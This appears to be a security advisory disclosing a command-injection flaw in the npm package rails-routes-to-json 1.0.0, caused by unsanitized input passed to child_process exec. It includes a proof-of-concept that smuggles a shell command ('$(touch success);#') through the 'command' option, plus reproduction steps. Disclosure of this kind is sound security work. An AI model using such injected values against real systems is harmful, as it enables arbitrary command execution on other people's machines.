# Vulnerability in rails-routes-to-json

This report details an ACI vulnerability affecting `rails-routes-to-json@1.0.0`.

## Package source

* <https://www.npmjs.com/rails-routes-to-json>

## Vulnerability Overview

Affected versions of this package are vulnerable to arbitrary command injection (CWE-77 [1]).

If (attacker-controlled) user input is given to the "command" key of the "options" argument of the package constructor, it is possible for an attacker to execute arbitrary commands on the operating system that this package is being run on.

This vulnerability is due to use of the `child_process` `exec` function without input sanitization. The Node.js API documentation states that unsanitized user input should never be passed to `exec` [2].

[1] <https://cwe.mitre.org/data/definitions/77.html>

[2] <https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback>

## Reproduction

To exploit this vulnerability, another package must include "rails-routes-to-json" as a dependency and pass user-controlled input to the "command" option of "rails-routes-to-json".

The proof-of-concept (PoC) program below illustrates the issue. Executing this code will cause the command `touch success` to be executed, leading to the creation of a file called `success`.

```
var PUT = require('rails-routes-to-json');
var x = "$(touch success);#";
try {
	new PUT({'command': x}, function(x) {});
} catch (e) {
	console.log(e);
}
```

Steps to reproduce:

1. `npm i rails-routes-to-json@1.0.0`
2. Create a file, e.g., `poc0.js`, containing the PoC code.
3. Execute the file: `node poc0.js`
